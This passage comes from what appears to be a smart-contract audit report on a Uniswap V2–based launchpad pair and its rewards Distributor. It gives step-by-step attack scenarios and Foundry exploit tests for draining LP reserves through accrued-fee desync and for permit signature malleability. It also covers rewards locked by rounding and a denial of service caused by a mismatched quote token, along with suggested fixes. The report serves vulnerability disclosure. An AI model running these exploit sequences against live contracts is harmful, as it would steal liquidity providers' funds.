3) Same block t: A normal swap occurs that pays launchpad fees. Inside swap, _getLaunchpadFees returns non‑zero fees; _update sees timeElapsed == 0 and stores them in accruedLaunchpadFee{0,1} (not distributed). Reserves are updated net of these accrued fees while the actual balances still include them.
4) Block t+1: Attacker deposits only one side (e.g., token1) sized to roughly match price so that liquidity = min(amount0 * totalSupply / reserve0, amount1 * totalSupply / reserve1) uses both sides. Crucially, in mint:
   - amount0 = balance0 - reserve0 = (attackerDeposit0=0) + accruedLaunchpadFee0
   - amount1 = attackerDeposit1
   This mints LP shares as if the attacker had provided token0 equal to the already‑accrued fees.
   During the same mint, _update runs with timeElapsed > 0 and distributes the previously accrued fees to the distributor, resetting accruedLaunchpadFee{0,1} to zero. The fees are now gone from the pair’s balances, but the attacker keeps the over‑credited LP shares.
5) Later (same or subsequent blocks), the attacker burns their LP and withdraws a pro‑rata share of the pool’s reserves. Since their LP was minted using phantom token0 (the accrued fees), they extract reserves they did not fund. The distributor still received the full accrued fees during the mint’s _update, so the shortfall comes out of the pool reserves (honest LPs).
6) The attacker can repeat whenever they can get accruedLaunchpadFee{0,1} > 0 (e.g., by calling sync and letting swaps accrue fees in the same block).
Net effect: LP shares are minted against accrued fees, then those fees are distributed away, leaving an over‑issued LP position that can be burned to drain reserves.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "../contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import "@gte-univ2-core/interfaces/IUniswapV2Factory.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Simple ERC20 with mint
contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

// Minimal distributor that just pulls fees from the pair
contract MockDistributor {
    mapping(address => uint256) public received;

    function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
        if (amount0 > 0) {
            IERC20(token0).transferFrom(msg.sender, address(this), amount0);
            received[token0] += amount0;
        }
        if (amount1 > 0) {
            IERC20(token1).transferFrom(msg.sender, address(this), amount1);
            received[token1] += amount1;
        }
    }
}

// Test contract also acts as the factory so feeTo() calls succeed
contract LaunchpadFeeDesyncTest is Test, IUniswapV2Factory {
    using stdStorage for StdStorage;

    GTELaunchpadV2Pair public pair;
    MockERC20 public token0;
    MockERC20 public token1;
    MockDistributor public distributor;

    address public attacker = address(0xA11CE);
    address public trader = address(0xB0B);

    function setUp() public {
        token0 = new MockERC20("T0", "T0");
        token1 = new MockERC20("T1", "T1");
        distributor = new MockDistributor();

        // Deploy pair with this contract as factory
        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(token0), address(token1), address(this), address(distributor));

        // Mint tokens
        token0.mint(address(this), 1_000_000 ether);
        token1.mint(address(this), 1_000_000 ether);
        token0.mint(trader, 10_000 ether);
        token1.mint(attacker, 10_000 ether);

        // Initial liquidity (as launchpad LP == this contract)
        token0.transfer(address(pair), 1_000 ether);
        token1.transfer(address(pair), 1_000 ether);
        pair.mint(address(this));

        // Move time forward so future sync/swap see timeElapsed > 0 when needed
        vm.warp(100);
        vm.roll(1);
    }

    // ---- IUniswapV2Factory minimal impl ----
    function feeTo() external pure override returns (address) { return address(0); }
    function feeToSetter() external pure override returns (address) { return address(0); }
    function getPair(address, address) external pure override returns (address) { return address(0); }
    function allPairs(uint256) external pure override returns (address) { return address(0); }
    function allPairsLength() external pure override returns (uint256) { return 0; }
    function createPair(address, address) external pure override returns (address) { return address(0); }
    function setFeeTo(address) external override {}
    function setFeeToSetter(address) external override {}

    function test_launchpadFee_doubleSpend_attack() public {
        // Block N: attacker calls sync to set blockTimestampLast to this block
        vm.warp(200);
        vm.roll(2);
        pair.sync();

        // Still in block N: trader performs a swap token0 -> token1, accruing launchpad fees with timeElapsed == 0
        (uint112 r0, uint112 r1,) = pair.getReserves();
        uint256 amount0In = 100 ether;
        uint256 amount0InWithFee = amount0In * 997;
        uint256 numerator = amount0InWithFee * uint256(r1);
        uint256 denominator = uint256(r0) * 1000 + amount0InWithFee;
        uint256 amount1Out = numerator / denominator;

        vm.startPrank(trader);
        token0.transfer(address(pair), amount0In);
        pair.swap(0, amount1Out, trader, "");
        vm.stopPrank();

        uint112 accrued0 = pair.accruedLaunchpadFee0();
        assertGt(accrued0, 0, "launchpad fee not accrued");

        // Record pool and attacker total value before the exploit cycle
        uint256 pairTotalBefore = token0.balanceOf(address(pair)) + token1.balanceOf(address(pair));
        uint256 attackerTotalBefore = token0.balanceOf(attacker) + token1.balanceOf(attacker);

        // Block N+1: attacker mints using accruedLaunchpadFee0 as fake token0 deposit
        vm.warp(300);
        vm.roll(3);
        (r0, r1,) = pair.getReserves();
        accrued0 = pair.accruedLaunchpadFee0();
        assertGt(accrued0, 0, "accrued fee lost before mint");

        uint256 deposit1 = uint256(accrued0) * uint256(r1) / uint256(r0);
        if (deposit1 == 0) deposit1 = 1; // ensure non-zero

        vm.startPrank(attacker);
        token1.transfer(address(pair), deposit1);
        pair.mint(attacker);
        vm.stopPrank();

        // Accrued fees should have been distributed during mint's _update
        assertEq(pair.accruedLaunchpadFee0(), 0, "fees not distributed");
        assertGt(distributor.received(address(token0)), 0, "distributor did not receive fees");

        uint256 lpBal = pair.balanceOf(attacker);
        assertGt(lpBal, 0, "no LP minted to attacker");

        // Block N+2: attacker burns LP to realize stolen share of reserves
        vm.warp(400);
        vm.roll(4);
        vm.startPrank(attacker);
        pair.transfer(address(pair), lpBal);
        pair.burn(attacker);
        vm.stopPrank();

        uint256 attackerTotalAfter = token0.balanceOf(attacker) + token1.balanceOf(attacker);
        uint256 pairTotalAfter = token0.balanceOf(address(pair)) + token1.balanceOf(address(pair));

        assertGt(attackerTotalAfter, attackerTotalBefore, "attacker did not profit");
        assertLt(pairTotalAfter, pairTotalBefore, "pool reserves not reduced");
    }
}


## Suggested Mitigation
Fully decouple accrued-fee accounting from LP mint/burn math so accrued fees can never be treated as user deposits or redeemed by LPs:
- In mint, exclude accrued fees from the computed deposit deltas: amount0 = balance0 - accruedLaunchpadFee0 - reserve0; amount1 = balance1 - accruedLaunchpadFee1 - reserve1; clamp at zero. This ensures previously accrued fees do not inflate the min(amount0/reserve0, amount1/reserve1) ratio.
- In burn, compute payouts from balances net of accrued fees: amount0 = liquidity * (balance0 - accruedLaunchpadFee0) / totalSupply; amount1 = liquidity * (balance1 - accruedLaunchpadFee1) / totalSupply. This prevents LPs from redeeming the undistributed launchpad fees.
- Optionally, on entry to mint/burn, if timeElapsed > 0 and any accrued fees exist, distribute them first to keep balances and reserves aligned before computing mint/burn amounts.
- Add invariants/assertions: ensure accruedLaunchpadFeeX <= balanceX - reserveX at all times and that any balance‑reducing path while fees are accrued maintains this relation (or forces distribution). This guards against future desyncs.
Alternative: avoid persisting accrued fees on the pair at all. Instead, compute fees from deltas and transfer them directly to the distributor within the same transaction, removing the need for accruedLaunchpadFee state.





 **Derived From** : UniswapV2 LP token permit() missing low‑s and v validation (signature malleability)

## [L-4]. UniswapV2ERC20.permit accepts malleable signatures (no low-s or strict v checks), enabling signature malleability

### Finding Severity Justification: The UniswapV2ERC20.permit implementation used by GTELaunchpadV2Pair does not enforce low-s or strict v checks, allowing signature malleability. This does not enable theft of assets or replay within the contract due to nonce usage and standard EIP-2612 semantics, but it can affect integrations that assume canonical signatures. As such, impact is limited and non-funds-threatening, fitting QA/Low severity.
## Derived From Pattern/Invariant
UniswapV2 LP token permit() missing low‑s and v validation (signature malleability)

## Exploit Type
SignatureMalleability

## Location
UniswapV2ERC20.permit

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: There is slight ambiguity about whether upstream library code is considered in-scope; however, the implementation is used directly by an in-scope contract. The technical claim is correct, but impact is limited, so marking as valid with low severity.
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The GTELaunchpadV2Pair contract inherits from UniswapV2ERC20, which implements an EIP-2612-style permit function. This implementation does not enforce EIP-2 low-s rules or a strict v range, so multiple (v, s) pairs can represent the same logical signature. While nonces prevent simple replay within this contract, lack of canonicalization creates signature malleability concerns.

Relevant code in UniswapV2ERC20:

```solidity
bytes32 public DOMAIN_SEPARATOR;
bytes32 public constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;
mapping(address => uint256) public nonces;

function permit(
    address owner,
    address spender,
    uint256 value,
    uint256 deadline,
    uint8 v,
    bytes32 r,
    bytes32 s
) external {
    require(deadline >= block.timestamp, "UniswapV2: EXPIRED");
    bytes32 digest = keccak256(
        abi.encodePacked(
            "\x19\x01",
            DOMAIN_SEPARATOR,
            keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))
        )
    );
    address recoveredAddress = ecrecover(digest, v, r, s);
    require(recoveredAddress != address(0) && recoveredAddress == owner, "UniswapV2: INVALID_SIGNATURE");
    _approve(owner, spender, value);
}
```

Issues:
- No low-s check: there is no restriction that s <= secp256k1n/2. For any valid signature (r, s, v), there exists an alternative (r, n - s, v ^ 1) that also recovers to the same address for the same message. Both signatures are accepted.
- No strict v check: v is not constrained to 27 or 28 (or normalized from 0/1). Any v that ecrecover happens to accept is allowed.

Consequences:
- Signatures are *malleable*: multiple different (v, r, s) triplets can authorize the same (owner, spender, value, nonce, deadline) operation.
- While nonces[owner]++ prevents a single logical permit from being reused in this specific contract, off-chain or cross-contract systems that assume a 1:1 mapping between a signature byte string and an action may break. For example, a signature used to whitelist an address in an external registry or to prove uniqueness elsewhere could be trivially transformed by flipping s and v without access to the owner's private key.

This matches the SignatureMalleability pattern: the permit implementation does not enforce canonical signatures and therefore fails to provide the stronger, non-malleable guarantees some integrations expect.

## Impact
Within this LP token itself, funds cannot be directly stolen because nonces are incremented on each permit, preventing replay of the *same* logical signature. However, the lack of low-s and v validation means third parties or off-chain systems that rely on the uniqueness of a given (v, r, s) signature as an identifier or proof can be tricked: an attacker can generate alternate, equally valid signatures for the same permit call without the owner's private key. This can undermine external authorization schemes or analytics that assume signatures are canonical.

## Command to Run Test


## Proof of Concept
An attacker observing a valid EIP-2612 permit signature (v, r, s) for a given (owner, spender, value, nonce, deadline) can derive an alternative signature (v2, r, s2) where s2 = secp256k1n - s and v2 flips the recovery bit (27 <-> 28). Because UniswapV2ERC20.permit forwards (v, r, s) directly into ecrecover without enforcing the EIP-2 low‑s rule or strict v validation, it will accept both the original and the malleated signature for the same logical authorization. While the nonce prevents calling permit twice for the same authorization within this token, the existence of multiple valid encodings for the same message breaks canonical-signature assumptions for off-chain verifiers or cross-contract workflows. The Foundry test below demonstrates that the malleated high‑S signature recovers the same owner and is accepted by permit(), setting allowance successfully.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "@gte-univ2-core/UniswapV2ERC20.sol";

contract PermitMalleabilityTest is Test {
    // secp256k1 curve order
    uint256 constant SECP256K1N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    UniswapV2ERC20 token;

    function setUp() public {
        token = new UniswapV2ERC20();
    }

    function test_permitAcceptsMalleatedHighSSignature() public {
        // Prepare owner keypair and params
        uint256 ownerPk = uint256(keccak256("owner-pk"));
        address owner = vm.addr(ownerPk);
        address spender = address(0xBEEF);
        uint256 value = 123;
        uint256 nonce = token.nonces(owner); // expect 0
        uint256 deadline = block.timestamp + 1 days;

        // Build EIP-712 digest exactly as in UniswapV2ERC20.permit
        bytes32 structHash = keccak256(
            abi.encode(
                token.PERMIT_TYPEHASH(),
                owner,
                spender,
                value,
                nonce,
                deadline
            )
        );
        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19\x01",
                token.DOMAIN_SEPARATOR(),
                structHash
            )
        );

        // Canonical low-s signature returned by the signer
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPk, digest);
        assertEq(ecrecover(digest, v, r, s), owner, "canonical signature must recover owner");

        // Derive malleated signature: s' = n - s; v' flips between 27 and 28
        uint256 sUint = uint256(s);
        // Ensure we start from low-s (common for modern signers); produce the high-s complement
        require(sUint <= SECP256K1N / 2, "expected canonical low-s from signer");
        bytes32 s2 = bytes32(SECP256K1N - sUint);
        uint8 v2 = (v == 27) ? 28 : 27;

        // Both signatures recover the same owner
        address rec2 = ecrecover(digest, v2, r, s2);
        assertEq(rec2, owner, "malleated signature must recover same owner");

        // Prove the contract accepts the malleated (high-s) signature and sets allowance
        // Note: permit is permissionless; anyone can submit the signature
        token.permit(owner, spender, value, deadline, v2, r, s2);
        assertEq(token.allowance(owner, spender), value, "permit must accept high-s signature");
    }
}


## Suggested Mitigation
Enforce canonical ECDSA signatures in permit by: (1) requiring s <= secp256k1n/2, and (2) enforcing v in {27, 28} (optionally normalize 0/1 to 27/28 first). Consider using OpenZeppelin’s ECDSA library for recover to avoid pitfalls. Example:

function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external {
    require(deadline >= block.timestamp, "UniswapV2: EXPIRED");
    // Optional: normalize v
    if (v == 0 || v == 1) v += 27;
    require(v == 27 || v == 28, "INVALID_V");
    // Enforce low-s per EIP-2
    require(uint256(s) <= 0x7fffffffffffffffffffffffffffffff5d576e7357a4501ddfe92f46681b20a0, "INVALID_S");

    bytes32 digest = keccak256(abi.encodePacked("\x19\x01", DOMAIN_SEPARATOR, keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))));
    address recovered = ecrecover(digest, v, r, s);
    require(recovered != address(0) && recovered == owner, "UniswapV2: INVALID_SIGNATURE");
    _approve(owner, spender, value);
}

This removes signature malleability by ensuring a unique canonical encoding per logical authorization.





 **Derived From** : Rounding in rewards index vs totalPendingRewards can lock undistributable rewards

## [L-5]. RewardsTrackerLib.update can zero out small pending rewards while Distributor.totalPendingRewards still counts them, permanently locking tokens

### Finding Severity Justification: The bug causes rounding-dust rewards to be wiped from the pool’s accounting while still being counted as liabilities in Distributor.totalPendingRewards, permanently locking those tokens in the contract and preventing admin recovery via skimExcessRewards. There is no theft or user capital loss; impact is primarily stuck funds and loss of small reward amounts. While fees forwarded from the AMM could also be affected, the affected amounts are typically small relative to total shares. This aligns with dust yield/accounting discrepancies and skimming limitations, which are generally Low severity.
## Derived From Pattern/Invariant
Rounding in rewards index vs totalPendingRewards can lock undistributable rewards

## Exploit Type
AccountingInvariantViolation

## Location
Distributor.addRewards

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Distributor tracks reward liabilities in totalPendingRewards[asset], which is incremented by the full deposited amount in addRewards and only decremented when rewards are actually paid out in _distributeAssets. However, the underlying reward index in RewardsTrackerLib.update() uses integer math and unconditionally deletes pendingBaseRewards / pendingQuoteRewards even when the per‑share increment is zero. This breaks the invariant that totalPendingRewards equals the sum of all future user payouts.

Key paths:

Distributor.addRewards:

```solidity
function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    (address launchAsset, address quoteAsset, uint128 launchAssetAmount, uint128 quoteAssetAmount) =
        (token0, token1, amount0, amount1);
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(token0);
    ...
    if (rs.totalShares == 0) revert NoSharesToIncentivize();

    if (launchAssetAmount > 0) {
        rs.addBaseRewards(launchAsset, launchAssetAmount);
        _increaseTotalPending(launchAsset, launchAssetAmount);
        launchAsset.safeTransferFrom(msg.sender, address(this), uint256(launchAssetAmount));
    }
    ...
}

function _increaseTotalPending(address asset, uint256 amount) internal {
    unchecked {
        totalPendingRewards[asset] += amount;
    }
}
```

RewardsTrackerLib.update and getAccRewardsPerShare:

```solidity
uint128 public constant PRECISION_FACTOR = 1e12;

function update(RewardPoolData storage self)
    internal
    returns (uint256 newAccBaseRewardsPerShare, uint256 newAccQuoteRewardsPerShare)
{
    (newAccBaseRewardsPerShare, newAccQuoteRewardsPerShare) = getAccRewardsPerShare(self);

    if (self.pendingBaseRewards > 0) {
        self.accBaseRewardPerShare = newAccBaseRewardsPerShare;
        delete self.pendingBaseRewards; // pending wiped even if per-share delta == 0
    }

    if (self.pendingQuoteRewards > 0) {
        self.accQuoteRewardPerShare = newAccQuoteRewardsPerShare;
        delete self.pendingQuoteRewards;
    }
}

function getAccRewardsPerShare(RewardPoolData storage self)
    internal
    view
    returns (uint256 accBaseRewardsPerShare, uint256 accQuoteRewardsPerShare)
{
    uint96 totalShares = self.totalShares;
    if (totalShares == 0) return (self.accBaseRewardPerShare, self.accQuoteRewardPerShare);

    accBaseRewardsPerShare = self.accBaseRewardPerShare;
    accQuoteRewardsPerShare = self.accQuoteRewardPerShare;

    if (self.pendingBaseRewards > 0) {
        accBaseRewardsPerShare += ((self.pendingBaseRewards * PRECISION_FACTOR) / uint128(totalShares));
    }
    ...
}
```

If pendingBaseRewards * PRECISION_FACTOR / totalShares == 0 (e.g. small reward vs very large totalShares), then getAccRewardsPerShare returns accBaseRewardsPerShare unchanged. Nevertheless, update() sees pendingBaseRewards > 0 and deletes it. No user ever receives any of those tokens, and no call ever passes a positive baseAmount into _distributeAssets for that deposit, so totalPendingRewards[baseAsset] is never decremented.

Distributor.skimExcessRewards then forbids withdrawing those tokens because it treats totalPendingRewards as a hard lower bound on liabilities:

```solidity
function skimExcessRewards(address asset, uint256 amount) external onlyOwnerOrRoles(ADMIN_ROLE) {
    if (amount > asset.balanceOf(address(this)) - totalPendingRewards[asset]) revert SkimOverflow();
    asset.safeTransfer(msg.sender, amount);
}
```

As a result, any deposit that produces a zero per‑share delta is permanently locked:
- The tokens sit in the Distributor’s balance.
- They are counted as totalPendingRewards[asset].
- No user can ever claim them (the index never moved).
- The owner cannot skim them, because balanceOf - totalPendingRewards == 0 for that portion.

Because addRewards is permissionless, any account can trigger such deposits (e.g. with very small amounts relative to totalShares), and normal user actions (claim/stake/unstake) will eventually call update() and wipe the pending bucket. Over time this causes increasing divergence between totalPendingRewards and actually claimable rewards.


## Impact
A portion of reward deposits (including launchpad fee rewards) can become permanently unclaimable yet still counted as pending in totalPendingRewards, preventing the owner from ever skimming those tokens as excess rewards. This breaks the accounting invariant that totalPendingRewards[asset] equals future user payouts and that balanceOf - totalPendingRewards is fully withdrawable. While no attacker can steal funds, real reward tokens can be stuck forever, and the admin loses the ability to recover them.

## Command to Run Test


## Proof of Concept
1. Deploy Distributor and set its launchpad address via initialize.
2. Create a rewards pair (launchAsset, quoteAsset) via createRewardsPair from the launchpad address.
3. From launchpad, give a user (alice) a very large share balance (e.g. 1e18) using increaseStake so that totalShares is huge.
4. An attacker mints 1 unit of launchAsset and approves Distributor.
5. The attacker calls addRewards(launchAsset, quoteAsset, 1, 0). This:
   - Increases RewardsTracker.pendingBaseRewards by 1.
   - Increases Distributor.totalPendingRewards[launchAsset] by 1.
   - Transfers 1 launchAsset into Distributor.
6. Alice calls claimRewards(launchAsset), which triggers RewardsTrackerLib.update():
   - newAccBaseRewardsPerShare += (1 * 1e12) / totalShares, which is 0 by integer division.
   - pendingBaseRewards > 0 so update() sets accBaseRewardPerShare to its old value and deletes pendingBaseRewards.
7. The claim returns baseAmount == 0 and quoteAmount == 0, so no rewards are paid out and _distributeAssets is called with baseAmount == 0.
8. After this:
   - launchAsset.balanceOf(Distributor) == 1.
   - totalPendingRewards[launchAsset] == 1.
   - No user has any pending base rewards from that deposit.
9. Any attempt by the owner to skim this 1 token with skimExcessRewards(launchAsset, 1) fails because amount > balanceOf - totalPendingRewards (1 > 1 - 1 == 0), so SkimOverflow() reverts.
10. The token is now permanently locked inside Distributor and neither stakers nor the admin can ever access it.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "../contracts/launchpad/Distributor.sol";

contract MockERC20 {
    string public name = "Mock";
    string public symbol = "MOCK";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount);
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount);
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount);
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract DistributorZeroDeltaTest is Test {
    Distributor distributor;
    MockERC20 launchAsset;
    MockERC20 quoteAsset;
    address launchpad = address(this);
    address alice = address(0xA11CE);
    address attacker = address(0xBEEF);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(launchpad);

        launchAsset = new MockERC20();
        quoteAsset = new MockERC20();

        vm.prank(launchpad);
        distributor.createRewardsPair(address(launchAsset), address(quoteAsset));

        // Give Alice a very large share balance so that 1 reward token
        // results in a zero accRewardPerShare delta.
        vm.prank(launchpad);
        distributor.increaseStake(address(launchAsset), alice, 1e18);
    }

    function testZeroDeltaRewardsAreLocked() public {
        // Attacker funds and approves 1 launchAsset token as rewards.
        launchAsset.mint(attacker, 1);
        vm.prank(attacker);
        launchAsset.approve(address(distributor), 1);

        // Add 1 unit of base rewards.
        vm.prank(attacker);
        distributor.addRewards(address(launchAsset), address(quoteAsset), 1, 0);

        // Alice triggers RewardsTrackerLib.update() via claimRewards.
        vm.prank(alice);
        (uint256 baseAmount, uint256 quoteAmount) =
            distributor.claimRewards(address(launchAsset));
        assertEq(baseAmount, 0);
        assertEq(quoteAmount, 0);

        // The 1 token is stuck in the Distributor and counted as pending.
        assertEq(launchAsset.balanceOf(address(distributor)), 1);
        assertEq(distributor.totalPendingRewards(address(launchAsset)), 1);

        // Owner cannot skim it out because balance - totalPendingRewards == 0.
        vm.expectRevert(Distributor.SkimOverflow.selector);
        distributor.skimExcessRewards(address(launchAsset), 1);
    }
}


## Suggested Mitigation
In RewardsTrackerLib.update(), do not unconditionally delete pendingBaseRewards / pendingQuoteRewards. Instead, compute how many rewards actually entered the acc*RewardPerShare index and leave the integer-division remainder in the pending fields. For example:

```solidity
function update(RewardPoolData storage self)
    internal
    returns (uint256 newAccBaseRewardsPerShare, uint256 newAccQuoteRewardsPerShare)
{
    uint96 totalShares = self.totalShares;
    (newAccBaseRewardsPerShare, newAccQuoteRewardsPerShare) = getAccRewardsPerShare(self);

    if (self.pendingBaseRewards > 0 && totalShares > 0) {
        uint256 deltaAcc = newAccBaseRewardsPerShare - self.accBaseRewardPerShare;
        uint256 distributed = (uint256(deltaAcc) * uint256(totalShares)) / PRECISION_FACTOR;
        self.accBaseRewardPerShare = newAccBaseRewardsPerShare;
        self.pendingBaseRewards = uint128(self.pendingBaseRewards - distributed); // keep remainder
    }

    if (self.pendingQuoteRewards > 0 && totalShares > 0) {
        uint256 deltaAccQ = newAccQuoteRewardsPerShare - self.accQuoteRewardPerShare;
        uint256 distributedQ = (uint256(deltaAccQ) * uint256(totalShares)) / PRECISION_FACTOR;
        self.accQuoteRewardPerShare = newAccQuoteRewardsPerShare;
        self.pendingQuoteRewards = uint128(self.pendingQuoteRewards - distributedQ);
    }
}
```

Alternatively, track the total amount actually paid out (via the index) and decrease Distributor.totalPendingRewards by that amount, not by the raw addRewards deposit. The key is to ensure that whatever amount is counted in totalPendingRewards is exactly equal to the maximum tokens that can still be claimed by users, so that balanceOf - totalPendingRewards always represents excess rewards that are safe to skim.





 **Derived From** : Mismatched quote token in addRewards lets anyone brick reward pool accounting

## [M-6]. Permissionless addRewards accepts arbitrary quote token, causing reward-pool-wide DoS via totalPendingRewards underflow

### Finding Severity Justification: Permissionless misuse of addRewards allows depositing an arbitrary quote token into a valid pool, desynchronizing accounting (pendingQuoteRewards vs totalPendingRewards for the canonical quote). This causes claimRewards and any stake/unstake that realizes quote rewards to revert, resulting in pool-wide DoS of matured quote rewards and blocking core launchpad operations until externally healed. No direct user capital theft occurs, but availability and matured yield distribution are significantly impacted.
## Derived From Pattern/Invariant
Mismatched quote token in addRewards lets anyone brick reward pool accounting

## Exploit Type
AccessControl

## Location
Distributor.addRewards

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Distributor.addRewards determines which reward pool to use based only on which of token0 or token1 already has a configured quoteAsset. It never validates that the supplied secondary token (quoteAsset) actually matches the pool’s canonical quote asset.

Relevant code:

```solidity
function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    (address launchAsset, address quoteAsset, uint128 launchAssetAmount, uint128 quoteAssetAmount) =
        (token0, token1, amount0, amount1);
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(token0);

    if (rs.quoteAsset == address(0)) {
        rs = RewardsTrackerStorage.getRewardPool(token1);

        if (rs.quoteAsset == address(0)) revert RewardsDoNotExist();

        (launchAsset, quoteAsset, launchAssetAmount, quoteAssetAmount) = (token1, token0, amount1, amount0);
    }

    if (rs.totalShares == 0) revert NoSharesToIncentivize();

    if (launchAssetAmount > 0) {
        rs.addBaseRewards(launchAsset, launchAssetAmount);
        _increaseTotalPending(launchAsset, launchAssetAmount);
        launchAsset.safeTransferFrom(msg.sender, address(this), uint256(launchAssetAmount));
    }

    if (quoteAssetAmount > 0) {
        rs.addQuoteRewards(launchAsset, quoteAsset, quoteAssetAmount);
        _increaseTotalPending(quoteAsset, quoteAssetAmount);
        quoteAsset.safeTransferFrom(msg.sender, address(this), uint256(quoteAssetAmount));
    }
}
```

createRewardsPair only initializes a pool for the chosen launch asset:

```solidity
function createRewardsPair(address launchAsset, address quoteAsset) external onlyLaunchpad {
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);
    RewardPoolData storage rsq = RewardsTrackerStorage.getRewardPool(quoteAsset);

    if (rs.quoteAsset != address(0) || rsq.quoteAsset != address(0)) revert RewardsExist();

    rs.initializePair(launchAsset, quoteAsset);
}
```

Thus, for a valid pool (launchAsset, realQuoteAsset), the stored RewardPoolData lives under key launchAsset and has rs.quoteAsset == realQuoteAsset, while getRewardPool(realQuoteAsset).quoteAsset is still zero.

Because addRewards never checks that quoteAsset == rs.quoteAsset, a malicious user can do:
- token0 = launchAsset (which selects the correct pool),
- token1 = arbitraryToken (not equal to rs.quoteAsset),
- amount1 > 0.

This call will:
- Treat launchAsset as the pool base asset (correct).
- Treat arbitraryToken as the quoteAsset parameter passed into rs.addQuoteRewards.
- Increase rs.pendingQuoteRewards by amount1 (used to calculate quote rewards for all stakers of launchAsset).
- Increase totalPendingRewards[arbitraryToken] by amount1 and transfer arbitraryToken tokens into Distributor.

However, when any user later stakes/unstakes/claims, Distributor distributes rewards using the pool’s canonical quoteAsset, not arbitraryToken:

```solidity
function claimRewards(address launchAsset) external returns (uint256 baseAmount, uint256 quoteAmount) {
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(launchAsset);
    (baseAmount, quoteAmount) = rs.claim(msg.sender);
    _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount);
}

function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
    if (baseAmount > 0) {
        _decreaseTotalPending(base, baseAmount);
        base.safeTransfer(msg.sender, baseAmount);
    }

    if (quoteAmount > 0) {
        _decreaseTotalPending(quote, quoteAmount);
        quote.safeTransfer(msg.sender, quoteAmount);
    }
}

function _decreaseTotalPending(address asset, uint256 amount) internal {
    uint256 currTotal = totalPendingRewards[asset];
    if (currTotal < amount) revert ClaimAmountExceedsTotalPendingRewards();
    unchecked { totalPendingRewards[asset] -= amount; }
}
```

For the malicious deposit:
- rs.pendingQuoteRewards is credited with arbitraryToken amounts but conceptually denominated in the canonical quote token.
- totalPendingRewards[canonicalQuoteAsset] is NOT increased.
- totalPendingRewards[arbitraryToken] is increased and the contract holds arbitraryToken, which is never used for payouts.

When a staker claims or updates position:
- RewardsTrackerLib.update() incorporates rs.pendingQuoteRewards into accQuoteRewardPerShare.
- rs.claim(user) returns a positive quoteAmount in terms of the canonical quote token.
- _distributeAssets then calls _decreaseTotalPending(rs.quoteAsset, quoteAmount).
- Because totalPendingRewards[rs.quoteAsset] never reflected the malicious deposit, currTotal < quoteAmount and ClaimAmountExceedsTotalPendingRewards() reverts.

This causes all stake/unstake/claim calls that would realize those quote rewards to revert, effectively bricking quote-side rewards for the pool until enough *real* quoteAsset has been donated through honest addRewards calls to cover the mismatch. Because addRewards is permissionless, any address can grief any active reward pool this way using an arbitrary ERC-20 they control.

## Impact
A permissionless caller can add quote rewards using an arbitrary ERC-20 that does not match the pool’s canonical quote asset. This credits pendingQuoteRewards for the pool while increasing totalPendingRewards for the wrong token. When users later claim (or when stake/unstake realizes quote rewards), the contract attempts to decrease totalPendingRewards of the canonical quote asset, which has not been incremented, and the call reverts with ClaimAmountExceedsTotalPendingRewards. This causes a pool-wide DoS for quote rewards (and any operation that realizes them) until enough of the real quote asset is later donated to cover the mismatch. The attacker’s bogus tokens become locked in the contract (accounted as pending for the wrong asset) and are not usable for payouts.

## Command to Run Test


## Proof of Concept
1. Deploy Distributor and set launchpad = address(this) via initialize.
2. Deploy three ERC-20 mocks: launchAsset, realQuoteAsset, and bogusQuote.
3. From launchpad, call createRewardsPair(address(launchAsset), address(realQuoteAsset)). This sets up the rewards pool with rs.quoteAsset == realQuoteAsset.
4. From launchpad, give a victim user (alice) at least 1 share by calling increaseStake(launchAsset, alice, 1). Now rs.totalShares > 0.
